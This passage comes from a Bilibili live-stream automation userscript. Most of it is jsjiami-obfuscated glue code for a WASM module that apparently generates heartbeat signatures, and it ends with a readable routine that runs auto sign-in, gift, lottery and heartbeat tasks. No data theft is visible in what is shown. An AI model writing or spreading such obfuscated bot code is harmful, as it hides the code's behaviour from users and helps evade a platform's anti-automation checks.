x34\x61\x30\x65\x63\x36\x65\x35\x39\x64\x33\x37\x66\x38\x37\x65\x30\x35\x32\x31\x63\x33\x62':function(_0x25a672,_0x1e7477){_0x1e7477=_0xf4dc8b[_0x314c('365','\x5d\x31\x73\x72')][_0x314c('3dc','\x4d\x75\x32\x25')](_0x1e7477),_0xf4dc8b[_0x314c('3cb','\x62\x5e\x4a\x7a')][_0x314c('3dd','\x70\x48\x6e\x21')](_0x25a672,_0x1e7477[_0x314c('3de','\x4f\x4d\x34\x67')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x36\x32\x65\x66\x34\x33\x63\x66\x39\x35\x62\x31\x32\x61\x39\x62\x35\x63\x64\x65\x63\x31\x36\x33\x39\x34\x33\x39\x63\x39\x37\x32\x64\x36\x33\x37\x33\x32\x38\x30':function(_0x145337,_0x117984){var _0x3b6b94={'\x69\x52\x77\x4b\x72':_0x43514a['\x56\x75\x6c\x65\x46']};if(_0x43514a[_0x314c('3df','\x4b\x74\x36\x4b')](_0x43514a[_0x314c('3e0','\x4a\x61\x48\x39')],_0x43514a[_0x314c('3e1','\x35\x44\x32\x4f')])){console[_0x314c('3e2','\x38\x78\x71\x41')](_0x3b6b94[_0x314c('3e3','\x4b\x74\x36\x4b')],e);}else{_0x117984=_0xf4dc8b[_0x314c('31a','\x4d\x68\x38\x36')][_0x314c('3e4','\x54\x47\x31\x45')](_0x117984),_0xf4dc8b[_0x314c('3e5','\x4c\x47\x63\x30')][_0x314c('3dd','\x70\x48\x6e\x21')](_0x145337,_0x117984['\x63\x68\x69\x6c\x64\x4e\x6f\x64\x65\x73']);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x36\x66\x63\x63\x65\x30\x61\x61\x65\x36\x35\x31\x65\x32\x64\x37\x34\x38\x65\x30\x38\x35\x66\x66\x31\x66\x38\x30\x30\x66\x38\x37\x36\x32\x35\x66\x66\x38\x63\x38':function(_0x40ffcb){if(_0x43514a[_0x314c('3e6','\x41\x55\x44\x5a')](_0x43514a[_0x314c('3e7','\x58\x72\x51\x54')],_0x43514a[_0x314c('3e8','\x33\x6a\x45\x23')])){r=_0xf4dc8b[_0x314c('3e9','\x4d\x75\x32\x25')][_0x314c('3ea','\x4a\x63\x71\x4b')](r),_0xf4dc8b[_0x314c('154','\x39\x68\x72\x66')][_0x314c('3d6','\x68\x53\x76\x4a')](_0x40ffcb,function(){try{return{'\x76\x61\x6c\x75\x65':r[_0x314c('3eb','\x40\x5b\x6f\x33')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x1ab828){return{'\x65\x72\x72\x6f\x72':_0x1ab828,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}else{_0xf4dc8b[_0x314c('2dc','\x29\x70\x73\x69')][_0x314c('3ec','\x33\x6a\x45\x23')](_0x40ffcb,document);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x37\x62\x61\x39\x66\x31\x30\x32\x39\x32\x35\x34\x34\x36\x63\x39\x30\x61\x66\x66\x63\x39\x38\x34\x66\x39\x32\x31\x66\x34\x31\x34\x36\x31\x35\x65\x30\x37\x64\x64':function(_0x20b106,_0x1b81a2){_0x1b81a2=_0xf4dc8b[_0x314c('3a7','\x6a\x55\x53\x40')][_0x314c('3ed','\x30\x28\x5b\x6e')](_0x1b81a2),_0xf4dc8b[_0x314c('1e4','\x44\x41\x42\x61')][_0x314c('2a8','\x4a\x63\x71\x4b')](_0x20b106,_0x1b81a2[_0x314c('3ee','\x5e\x32\x37\x57')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x38\x30\x64\x36\x64\x35\x36\x37\x36\x30\x63\x36\x35\x65\x34\x39\x62\x37\x62\x65\x38\x62\x36\x62\x30\x31\x63\x31\x65\x61\x38\x36\x31\x62\x30\x34\x36\x62\x66\x30':function(_0x424a29){_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('3ef','\x6c\x4f\x4b\x49')](_0x424a29);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x38\x39\x37\x66\x66\x32\x64\x30\x31\x36\x30\x36\x30\x36\x65\x61\x39\x38\x39\x36\x31\x39\x33\x35\x61\x63\x62\x31\x32\x35\x64\x31\x64\x64\x62\x66\x34\x36\x38\x38':function(_0x269613){var _0x4bdcf2=_0xf4dc8b[_0x314c('3f0','\x4a\x5a\x67\x35')]['\x61\x63\x71\x75\x69\x72\x65\x5f\x6a\x73\x5f\x72\x65\x66\x65\x72\x65\x6e\x63\x65'](_0x269613);return _0x43514a[_0x314c('3f1','\x30\x45\x2a\x43')](_0x4bdcf2,DOMException)&&_0x43514a[_0x314c('3f2','\x23\x4b\x40\x64')](_0x43514a['\x6c\x46\x71\x42\x54'],_0x4bdcf2['\x6e\x61\x6d\x65']);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x38\x63\x33\x32\x30\x31\x39\x36\x34\x39\x62\x62\x35\x38\x31\x62\x31\x62\x37\x34\x32\x65\x65\x65\x64\x66\x63\x34\x31\x30\x65\x32\x62\x65\x64\x64\x35\x36\x61\x36':function(_0x457e7b,_0x1bd361){if(_0x43514a['\x41\x6d\x52\x62\x6a'](_0x43514a['\x69\x6d\x6f\x6c\x47'],_0x43514a[_0x314c('3f3','\x43\x5e\x40\x53')])){var _0x52d653=_0xf4dc8b[_0x314c('3f0','\x4a\x5a\x67\x35')][_0x314c('3f4','\x45\x61\x5e\x30')](_0x457e7b);_0xf4dc8b[_0x314c('375','\x30\x28\x5b\x6e')][_0x314c('3f5','\x6a\x65\x59\x59')](_0x1bd361,_0x52d653);}else{BiliPushUtils[_0x314c('3f6','\x58\x72\x51\x54')]=function(_0x1eec77,_0x66c3d7){return f[_0x314c('3f7','\x6c\x4f\x4b\x49')](_0x1eec77,_0x66c3d7);};}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x31\x65\x36\x31\x30\x37\x33\x65\x39\x62\x64\x30\x30\x36\x33\x65\x30\x34\x34\x34\x61\x38\x62\x33\x66\x38\x61\x32\x37\x37\x30\x63\x64\x66\x39\x33\x38\x65\x63':function(_0x3624f8,_0x696247){if(_0x43514a['\x70\x6d\x64\x53\x55'](_0x43514a['\x6b\x64\x79\x73\x6a'],_0x43514a[_0x314c('3f8','\x4c\x47\x63\x30')])){_0x696247=_0xf4dc8b[_0x314c('342','\x45\x61\x5e\x30')][_0x314c('3f9','\x4a\x66\x66\x48')](_0x696247),_0xf4dc8b[_0x314c('31a','\x4d\x68\x38\x36')][_0x314c('3fa','\x39\x68\x72\x66')](_0x3624f8,0x438);}else{_0x43514a[_0x314c('3fb','\x30\x45\x2a\x43')](resolve);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x34\x36\x36\x61\x32\x61\x62\x39\x36\x63\x64\x37\x37\x65\x31\x61\x37\x37\x64\x63\x64\x62\x33\x39\x66\x34\x66\x30\x33\x31\x37\x30\x31\x63\x31\x39\x35\x66\x63':function(_0x756f20,_0x32bdb8){if(_0x43514a[_0x314c('3fc','\x54\x47\x31\x45')](_0x43514a[_0x314c('3fd','\x77\x7a\x70\x4e')],_0x43514a['\x62\x66\x69\x45\x68'])){_0x32bdb8=_0xf4dc8b[_0x314c('370','\x41\x55\x44\x5a')][_0x314c('3fe','\x45\x61\x5e\x30')](_0x32bdb8),_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x756f20,function(){if(_0x43514a[_0x314c('3ff','\x30\x28\x5b\x6e')](_0x43514a[_0x314c('400','\x6d\x69\x5d\x58')],_0x43514a[_0x314c('401','\x4d\x75\x32\x25')])){try{return{'\x76\x61\x6c\x75\x65':_0x32bdb8['\x70\x61\x74\x68\x6e\x61\x6d\x65'],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0xd9e5cc){return{'\x65\x72\x72\x6f\x72':_0xd9e5cc,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}else{return window[_0x314c('402','\x64\x75\x43\x75')]['\x63\x6f\x6d\x70\x69\x6c\x65'](_0x756f20);}}());}else{var _0x3c3b99=_0x43514a['\x58\x69\x76\x75\x69'][_0x314c('403','\x66\x70\x46\x36')]('\x7c'),_0x4b85b4=0x0;while(!![]){switch(_0x3c3b99[_0x4b85b4++]){case'\x30':_0x3af0ed[addr++]=_0x43514a[_0x314c('404','\x4b\x74\x36\x4b')](0x80,_0x43514a[_0x314c('405','\x50\x29\x62\x6b')](u,0x3f));continue;case'\x31':_0x3af0ed[addr++]=_0x43514a[_0x314c('406','\x30\x69\x67\x5d')](0x80,_0x43514a[_0x314c('407','\x4a\x66\x66\x48')](_0x43514a[_0x314c('408','\x30\x45\x2a\x43')](u,0x6),0x3f));continue;case'\x32':_0x3af0ed[addr++]=_0x43514a[_0x314c('409','\x44\x41\x42\x61')](0xfc,_0x43514a[_0x314c('40a','\x5d\x31\x73\x72')](u,0x1e));continue;case'\x33':_0x3af0ed[addr++]=_0x43514a[_0x314c('40b','\x30\x28\x5b\x6e')](0x80,_0x43514a[_0x314c('40c','\x30\x45\x2a\x43')](_0x43514a['\x71\x74\x73\x49\x4a'](u,0xc),0x3f));continue;case'\x34':_0x3af0ed[addr++]=_0x43514a[_0x314c('40d','\x35\x44\x32\x4f')](0x80,_0x43514a['\x6d\x42\x6f\x58\x68'](_0x43514a[_0x314c('40e','\x39\x68\x72\x66')](u,0x12),0x3f));continue;case'\x35':_0x3af0ed[addr++]=_0x43514a[_0x314c('40f','\x49\x64\x79\x5a')](0x80,_0x43514a[_0x314c('410','\x30\x44\x72\x77')](_0x43514a[_0x314c('411','\x64\x75\x43\x75')](u,0x18),0x3f));continue;}break;}}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x62\x30\x35\x66\x35\x33\x31\x38\x39\x64\x61\x63\x63\x63\x66\x32\x64\x33\x36\x35\x61\x64\x32\x36\x64\x61\x61\x34\x30\x37\x64\x34\x66\x37\x61\x62\x65\x61\x39':function(_0x435b30,_0x2c0aec){_0x2c0aec=_0xf4dc8b[_0x314c('2dc','\x29\x70\x73\x69')]['\x74\x6f\x5f\x6a\x73'](_0x2c0aec),_0xf4dc8b[_0x314c('156','\x55\x25\x59\x55')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x435b30,_0x2c0aec[_0x314c('412','\x49\x64\x79\x5a')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x30\x36\x64\x64\x65\x34\x61\x63\x66\x30\x39\x34\x33\x33\x62\x35\x31\x39\x30\x61\x34\x62\x30\x30\x31\x32\x35\x39\x66\x65\x35\x64\x34\x61\x62\x63\x62\x63\x32':function(_0x116b0c,_0x575d93){if(_0x43514a['\x4e\x41\x63\x75\x49'](_0x43514a[_0x314c('413','\x64\x75\x43\x75')],_0x43514a[_0x314c('414','\x4a\x63\x71\x4b')])){_0x575d93=_0xf4dc8b[_0x314c('3bb','\x40\x5b\x6f\x33')][_0x314c('221','\x40\x5b\x6f\x33')](_0x575d93),_0xf4dc8b[_0x314c('4c','\x67\x35\x29\x58')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x116b0c,_0x575d93[_0x314c('415','\x6a\x55\x53\x40')]);}else{_0x575d93=_0xf4dc8b[_0x314c('207','\x23\x7a\x39\x6a')][_0x314c('1f5','\x30\x44\x72\x77')](_0x575d93),_0xf4dc8b[_0x314c('230','\x6d\x69\x5d\x58')][_0x314c('416','\x4c\x47\x63\x30')](_0x116b0c,_0x575d93[_0x314c('417','\x37\x41\x46\x30')]);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x33\x33\x61\x33\x39\x64\x65\x34\x63\x61\x39\x35\x34\x38\x38\x38\x65\x32\x36\x66\x65\x39\x63\x61\x61\x32\x37\x37\x31\x33\x38\x65\x38\x30\x38\x65\x65\x62\x61':function(_0xb77857,_0x24945c){_0x24945c=_0xf4dc8b[_0x314c('26b','\x50\x29\x62\x6b')]['\x74\x6f\x5f\x6a\x73'](_0x24945c),_0xf4dc8b[_0x314c('370','\x41\x55\x44\x5a')][_0x314c('418','\x4d\x75\x32\x25')](_0xb77857,_0x24945c[_0x314c('419','\x66\x70\x46\x36')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x36\x66\x62\x65\x31\x31\x31\x65\x34\x34\x31\x33\x33\x33\x33\x39\x38\x35\x39\x39\x66\x36\x33\x64\x63\x30\x39\x62\x32\x36\x66\x38\x64\x31\x37\x32\x36\x35\x34':function(_0x205591,_0x5ca35a){_0x5ca35a=_0xf4dc8b[_0x314c('313','\x68\x53\x76\x4a')][_0x314c('41a','\x39\x68\x72\x66')](_0x5ca35a),_0xf4dc8b[_0x314c('31a','\x4d\x68\x38\x36')][_0x314c('3cd','\x6a\x65\x59\x59')](_0x205591,0x3db);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x63\x64\x66\x32\x38\x35\x39\x31\x35\x31\x37\x39\x31\x63\x65\x34\x63\x61\x64\x38\x30\x36\x38\x38\x62\x32\x30\x30\x35\x36\x34\x66\x62\x30\x38\x61\x38\x36\x31\x33':function(_0xf28fd5,_0x16a977){_0x16a977=_0xf4dc8b[_0x314c('344','\x6c\x4f\x4b\x49')][_0x314c('41b','\x4a\x5a\x67\x35')](_0x16a977),_0xf4dc8b[_0x314c('f','\x35\x44\x32\x4f')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0xf28fd5,function(){try{return{'\x76\x61\x6c\x75\x65':_0x16a977['\x68\x72\x65\x66'],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x394602){return{'\x65\x72\x72\x6f\x72':_0x394602,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x38\x65\x66\x38\x37\x63\x34\x31\x64\x65\x64\x31\x63\x31\x30\x66\x38\x64\x65\x33\x63\x37\x30\x64\x65\x61\x33\x31\x61\x30\x35\x33\x65\x31\x39\x37\x34\x37\x63':function(_0x282909,_0x513b5f){var _0x709cf1={'\x54\x57\x65\x73\x4b':_0x43514a[_0x314c('41c','\x4a\x66\x66\x48')]};_0x513b5f=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('41d','\x55\x25\x59\x55')](_0x513b5f),_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('41e','\x35\x44\x32\x4f')](_0x282909,function(){try{if(_0x43514a[_0x314c('41f','\x6a\x55\x53\x40')](_0x43514a['\x41\x6f\x41\x64\x46'],_0x43514a[_0x314c('420','\x46\x70\x7a\x61')])){return{'\x76\x61\x6c\x75\x65':_0x513b5f['\x68\x6f\x73\x74\x6e\x61\x6d\x65'],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}else{throw new ReferenceError(_0x709cf1['\x54\x57\x65\x73\x4b']);}}catch(_0x4f2f0c){return{'\x65\x72\x72\x6f\x72':_0x4f2f0c,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x39\x36\x33\x38\x64\x36\x34\x30\x35\x61\x62\x36\x35\x66\x37\x38\x64\x61\x66\x34\x61\x35\x61\x66\x39\x63\x39\x64\x65\x31\x34\x65\x63\x66\x31\x65\x32\x65\x63':function(_0x2a5061){if(_0x43514a[_0x314c('421','\x43\x5e\x40\x53')](_0x43514a[_0x314c('422','\x6d\x69\x5d\x58')],_0x43514a[_0x314c('423','\x4f\x4d\x34\x67')])){this[_0x314c('424','\x30\x45\x2a\x43')]=[];this['\x6c\x6f\x63\x6b\x65\x64']=![];}else{_0x2a5061=_0xf4dc8b[_0x314c('35e','\x54\x47\x31\x45')][_0x314c('425','\x44\x41\x42\x61')](_0x2a5061),_0xf4dc8b[_0x314c('342','\x45\x61\x5e\x30')]['\x75\x6e\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0x2a5061);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x61\x36\x61\x64\x39\x64\x38\x34\x31\x35\x65\x38\x34\x31\x31\x39\x36\x32\x31\x66\x35\x61\x61\x32\x63\x38\x36\x61\x33\x39\x61\x62\x63\x35\x38\x38\x62\x37\x35':function(_0x446f25,_0x15bcb3){var _0x11265b={'\x76\x50\x76\x4c\x6c':_0x43514a['\x46\x58\x49\x74\x51']};if(_0x43514a[_0x314c('426','\x49\x47\x28\x5d')](_0x43514a[_0x314c('427','\x44\x41\x42\x61')],_0x43514a[_0x314c('428','\x70\x48\x6e\x21')])){var _0xc174e9=_0x11265b[_0x314c('429','\x4c\x47\x63\x30')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x45694d=0x0;while(!![]){switch(_0xc174e9[_0x45694d++]){case'\x30':++this['\x73\x65\x71'];continue;case'\x31':this[_0x314c('42a','\x30\x69\x67\x5d')]=rsp[_0x314c('42b','\x38\x78\x71\x41')][_0x314c('42c','\x67\x35\x29\x58')];continue;case'\x32':this['\x74\x69\x6d\x65']=rsp[_0x314c('42d','\x55\x25\x59\x55')]['\x68\x65\x61\x72\x74\x62\x65\x61\x74\x5f\x69\x6e\x74\x65\x72\x76\x61\x6c'];continue;case'\x33':this[_0x314c('42e','\x30\x28\x5b\x6e')]=rsp[_0x314c('143','\x4b\x74\x36\x4b')][_0x314c('42f','\x43\x5e\x40\x53')];continue;case'\x34':this[_0x314c('430','\x35\x44\x32\x4f')]=rsp['\x64\x61\x74\x61']['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65'];continue;}break;}}else{_0x15bcb3=_0xf4dc8b[_0x314c('36a','\x30\x69\x67\x5d')][_0x314c('431','\x23\x4b\x40\x64')](_0x15bcb3),_0xf4dc8b[_0x314c('230','\x6d\x69\x5d\x58')][_0x314c('432','\x67\x35\x29\x58')](_0x446f25,0x248);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x66\x66\x35\x31\x30\x33\x65\x36\x63\x63\x31\x37\x39\x64\x31\x33\x62\x34\x63\x37\x61\x37\x38\x35\x62\x64\x63\x65\x32\x37\x30\x38\x66\x64\x35\x35\x39\x66\x63\x30':function(_0x12ffab){_0xf4dc8b[_0x314c('303','\x38\x78\x71\x41')][_0x314c('433','\x73\x6d\x59\x79')]=_0xf4dc8b[_0x314c('228','\x4b\x74\x36\x4b')][_0x314c('434','\x37\x41\x46\x30')](_0x12ffab);},'\x5f\x5f\x77\x65\x62\x5f\x6f\x6e\x5f\x67\x72\x6f\x77':_0x3220d6}},'\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65':function(_0x559e92){var _0x536c58={'\x65\x75\x66\x52\x42':function(_0x146302,_0x2540f7){return _0x43514a[_0x314c('435','\x70\x48\x6e\x21')](_0x146302,_0x2540f7);},'\x64\x43\x57\x49\x41':_0x43514a[_0x314c('436','\x58\x72\x51\x54')],'\x49\x7a\x70\x46\x66':_0x43514a[_0x314c('437','\x73\x6d\x59\x79')]};Object[_0x314c('438','\x5e\x32\x37\x57')](_0xf4dc8b,_0x43514a[_0x314c('439','\x23\x4b\x40\x64')],{'\x76\x61\x6c\x75\x65':_0x559e92});Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0xf4dc8b,_0x43514a['\x44\x62\x76\x73\x6d'],{'\x76\x61\x6c\x75\x65':_0xf4dc8b[_0x314c('43a','\x46\x70\x7a\x61')][_0x314c('43b','\x70\x48\x6e\x21')]['\x5f\x5f\x77\x65\x62\x5f\x6d\x61\x6c\x6c\x6f\x63']});Object[_0x314c('43c','\x66\x70\x46\x36')](_0xf4dc8b,_0x43514a[_0x314c('43d','\x4c\x47\x63\x30')],{'\x76\x61\x6c\x75\x65':_0xf4dc8b[_0x314c('43e','\x6c\x4f\x4b\x49')][_0x314c('43f','\x6d\x69\x5d\x58')][_0x314c('440','\x66\x70\x46\x36')]});Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0xf4dc8b,_0x43514a[_0x314c('441','\x67\x35\x29\x58')],{'\x76\x61\x6c\x75\x65':_0xf4dc8b[_0x314c('442','\x73\x6d\x59\x79')][_0x314c('443','\x30\x69\x67\x5d')][_0x314c('444','\x55\x25\x59\x55')]});_0xf4dc8b[_0x314c('25f','\x4b\x74\x36\x4b')][_0x314c('445','\x40\x5b\x6f\x33')]=function(_0x70c7d2,_0x4f6426){if(_0x536c58[_0x314c('446','\x6a\x55\x53\x40')](_0x536c58[_0x314c('447','\x6a\x55\x53\x40')],_0x536c58[_0x314c('447','\x6a\x55\x53\x40')])){try{var _0x5136f9=_0xf4dc8b['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('448','\x37\x41\x46\x30')](_0xf4dc8b['\x69\x6e\x73\x74\x61\x6e\x63\x65'][_0x314c('43f','\x6d\x69\x5d\x58')][_0x314c('449','\x46\x70\x7a\x61')](_0xf4dc8b[_0x314c('44a','\x37\x41\x46\x30')][_0x314c('44b','\x50\x29\x62\x6b')](_0x70c7d2),_0xf4dc8b[_0x314c('230','\x6d\x69\x5d\x58')]['\x70\x72\x65\x70\x61\x72\x65\x5f\x61\x6e\x79\x5f\x61\x72\x67'](_0x4f6426)));return _0x5136f9;}catch(_0x513cb8){console['\x6c\x6f\x67'](_0x536c58[_0x314c('44c','\x4a\x63\x71\x4b')],_0x513cb8);}}else{try{return{'\x76\x61\x6c\x75\x65':_0x4f6426[_0x314c('44d','\x41\x55\x44\x5a')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x513583){return{'\x65\x72\x72\x6f\x72':_0x513583,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}};_0x43514a['\x61\x43\x52\x61\x6c'](_0x3220d6);return _0xf4dc8b[_0x314c('44e','\x6c\x4f\x4b\x49')];}};}};;_0xod1='jsjiami.com.v6';

	const Run = async () => {
	    //await TokenLoad();
	    // 每天一次
	    Statistics.run();
	    if (CONFIG.AUTO_SIGN) Sign.run();
	    if (CONFIG.SILVER2COIN) Exchange.run();
	    if (CONFIG.AUTO_GROUP_SIGN) GroupSign.run();
	    if (CONFIG.AUTO_DAILYREWARD) DailyReward.run();
	    if (CONFIG.MOBILE_HEARTBEAT) {
		//MobileHeartbeat.run();
		WebHeartbeat.run();
	    }
	    //if (CONFIG.AUTO_GROUP_SIGN || CONFIG.AUTO_DAILYREWARD) createIframe('//api.live.bilibili.com', 'GROUPSIGN|DAILYREWARD');
	    // 每过一定时间一次
	    if (CONFIG.AUTO_TASK) Task.run();
	    if (CONFIG.AUTO_GIFT) Gift.run();
	    // 持续运行
	    //if (CONFIG.AUTO_TREASUREBOX) TreasureBox.run();
	    if (CONFIG.AUTO_LOTTERY) Lottery.run();
	    RafflePorcess.run();
	    TopRankTask.run();
	    HeartGift.run();
	    BiliPush.run();
	};

	$(document).ready(() => {
	    Init().then(Run);
	});
    }
})();
